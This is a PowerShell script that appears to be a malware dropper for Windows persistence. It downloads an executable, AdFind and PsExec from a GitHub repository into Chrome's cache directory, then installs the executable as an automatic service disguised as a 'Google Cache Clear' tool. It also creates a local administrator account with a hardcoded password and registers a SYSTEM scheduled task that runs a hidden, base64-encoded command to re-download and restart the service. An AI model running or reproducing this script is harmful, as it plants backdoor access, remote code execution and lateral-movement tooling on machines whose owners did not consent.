New-Item -ItemType Directory -Force -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/google_cache_clear_service.exe?raw=true" -OutFile "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/AdFind.exe?raw=true" -OutFile "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\AdFind.exe"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/PsExec.exe?raw=true" -OutFile "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\PsExec.exe"

#create service
New-Service -Name "google_cache_clear" -DisplayName "Google Cache Clear" -Description "Service clears unused data from google chrome cache" -StartupType "Automatic" -BinaryPathName "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
Start-Service -Name google_cache_clear

#new User
net user google_cache_account Igoty0u /add /expires:never
net localgroup administrators google_cache_account /add

#create task
$taskname = "google_cache_clear_check"
$taskdescription = "Cheks results of google cache clear"
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
  -Argument '-NoProfile -WindowStyle Hidden -enc "aQBmACgALQBuAG8AdAAoAFQAZQBzAHQALQBwAGEAdABoACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBzAGUAcgBOAGEAbQBlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAEcAbwBvAGcAbABlAFwAQwBoAHIAbwBtAGUAXABVAHMAZQByACAARABhAHQAYQBcAEQAZQBmAGEAdQBsAHQAXABDAGEAYwBoAGUAXABnAG8AbwBnAGwAZQBfAGMAYQBjAGgAZQBfAGMAbABlAGEAcgBfAHMAZQByAHYAaQBjAGUALgBlAHgAZQAiACkAKQAKACAAewAKAE4AZQB3AC0ASQB0AGUAbQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAEYAbwByAGMAZQAgAC0AUABhAHQAaAAgACIAQwBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgBVAHMAZQByAE4AYQBtAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAFUAcwBlAHIAIABEAGEAdABhAFwARABlAGYAYQB1AGwAdABcAEMAYQBjAGgAZQAiAAoAVwBnAGUAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBjAHUAZABrAGEAagBhAGsALwBzAHQAbwByAGEAZwBlAF8AdQBuAGkAdAAxADMALwBiAGwAbwBiAC8AbQBhAGkAbgAvAHQAbwBvAGwAcwAvAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByAF8AcwBlAHIAdgBpAGMAZQAuAGUAeABlAD8AcgBhAHcAPQB0AHIAdQBlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgBVAHMAZQByAE4AYQBtAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAFUAcwBlAHIAIABEAGEAdABhAFwARABlAGYAYQB1AGwAdABcAEMAYQBjAGgAZQBcAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByAF8AcwBlAHIAdgBpAGMAZQAuAGUAeABlACIACgBpAGYAKAAoAEcAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACAALQBlAHEAIAAkAG4AdQBsAGwAKQAKAHsACgBOAGUAdwAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIAAiAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByACIAIAAtAEQAaQBzAHAAbABhAHkATgBhAG0AZQAgACIARwBvAG8AZwBsAGUAIABDAGEAYwBoAGUAIABDAGwAZQBhAHIAIgAgAC0ARABlAHMAYwByAGkAcAB0AGkAbwBuACAAIgBTAGUAcgB2AGkAYwBlACAAYwBsAGUAYQByAHMAIAB1AG4AdQBzAGUAZAAgAGQAYQB0AGEAIABmAHIAbwBtACAAZwBvAG8AZwBsAGUAIABjAGgAcgBvAG0AZQAgAGMAYQBjAGgAZQAiACAALQBTAHQAYQByAHQAdQBwAFQAeQBwAGUAIAAiAEEAdQB0AG8AbQBhAHQAaQBjACIAIAAtAEIAaQBuAGEAcgB5AFAAYQB0AGgATgBhAG0AZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwAQwBhAGMAaABlAFwAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAXwBzAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgAKAFMAdABhAHIAdAAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIABnAG8AbwBnAGwAZQBfAGMAYQBjAGgAZQBfAGMAbABlAGEAcgAKAH0ACgAgAH0AIABlAGwAcwBlACAAewAKAGkAZgAoACgARwBlAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAIgBnAG8AbwBnAGwAZQBfAGMAYQBjAGgAZQBfAGMAbABlAGEAcgAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAAtAGUAcQAgACQAbgB1AGwAbAApAAoAewAKAE4AZQB3AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAIgAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBHAG8AbwBnAGwAZQAgAEMAYQBjAGgAZQAgAEMAbABlAGEAcgAiACAALQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAiAFMAZQByAHYAaQBjAGUAIABjAGwAZQBhAHIAcwAgAHUAbgB1AHMAZQBkACAAZABhAHQAYQAgAGYAcgBvAG0AIABnAG8AbwBnAGwAZQAgAGMAaAByAG8AbQBlACAAYwBhAGMAaABlACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgACIAQQB1AHQAbwBtAGEAdABpAGMAIgAgAC0AQgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBzAGUAcgBOAGEAbQBlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAEcAbwBvAGcAbABlAFwAQwBoAHIAbwBtAGUAXABVAHMAZQByACAARABhAHQAYQBcAEQAZQBmAGEAdQBsAHQAXABDAGEAYwBoAGUAXABnAG8AbwBnAGwAZQBfAGMAYQBjAGgAZQBfAGMAbABlAGEAcgBfAHMAZQByAHYAaQBjAGUALgBlAHgAZQAiAAoAUwB0AGEAcgB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByAAoAfQAKACAAfQA="'
$trigger =  New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -minutes 3)
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskname -Description $taskdescription -Settings $settings -User "System"